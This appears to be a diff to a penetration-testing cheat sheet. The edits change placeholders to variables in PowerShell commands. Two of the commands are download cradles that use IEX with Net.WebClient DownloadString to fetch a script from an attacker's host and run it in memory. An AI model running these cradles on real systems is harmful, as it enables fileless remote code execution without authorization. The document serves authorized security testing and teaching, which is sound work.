@@ -49,9 +49,9 @@ Always ensure you have **explicit** permission to access any computer system **b
       </td>
     </tr>
     <tr>
-      <td style="text-align:left"><code>cat &lt;C:\script.ps1&gt; | IEX</code>
+      <td style="text-align:left"><code>cat $script | IEX</code>
       </td>
-      <td style="text-align:left">Pipes the output of the script to the <code>Invoke-Expression</code> cmdlet,
+      <td style="text-align:left">Pipes the content of the script to the <code>Invoke-Expression</code> cmdlet,
         which runs any specified string as a command and returns the results to
         the console. <code>IEX</code> is an alias for <code>Invoke-Expression</code>.</td>
     </tr>
@@ -68,7 +68,7 @@ Always ensure you have **explicit** permission to access any computer system **b
     </tr>
     <tr>
       <td style="text-align:left">
-        <p><code>$text = Get-Content C:\temp\AnyFile.txt -Raw</code>
+        <p><code>$text = Get-Content $text_file -Raw</code>
         </p>
         <p><code>$script = [System.Management.Automation.ScriptBlock]::Create($text)</code>
         </p>
@@ -81,7 +81,7 @@ Always ensure you have **explicit** permission to access any computer system **b
         we can easily execute this compiled and formatted text file.</td>
     </tr>
     <tr>
-      <td style="text-align:left"><code>Echo IEX(New-Object Net.WebClient).DownloadString(http://&lt;ip:port/filename.ps1&gt;) | PowerShell -NoProfile -</code>
+      <td style="text-align:left"><code>Echo IEX(New-Object Net.WebClient).DownloadString(http://$ip:$port/$filename.ps1) | PowerShell -NoProfile -</code>
       </td>
       <td style="text-align:left">Download script from attacker&apos;s machine, then run in PowerShell,
         in memory. No files are written to disk.</td>
@@ -96,7 +96,7 @@ Always ensure you have **explicit** permission to access any computer system **b
 If your are able to use `Invoke-Expresion` \(`IEX`\) this module can be imported using the following command. You can also copy and paste the functions into your PowerShell session so the cmdlets become available to run. Notice the .ps1 extension. When using `downloadString` this will need to be a ps1 file to inject the module into memory in order to run the cmdlets.
 
 ```text
-IEX (New-Object -TypeName Net.WebClient).downloadString("http://$attacker_ipv4/$script.ps1")
+IEX (New-Object -TypeName Net.WebClient).downloadString("http://$attacker_ip/$script.ps1")
 ```
 
 `IEX` is blocked from users in most cases and `Import-Module` is monitored by things such as ATP. Downloading files to a target's machine is not always allowed in a penetration test. Another method to use is `Invoke-Command`. This can be done using the following format.
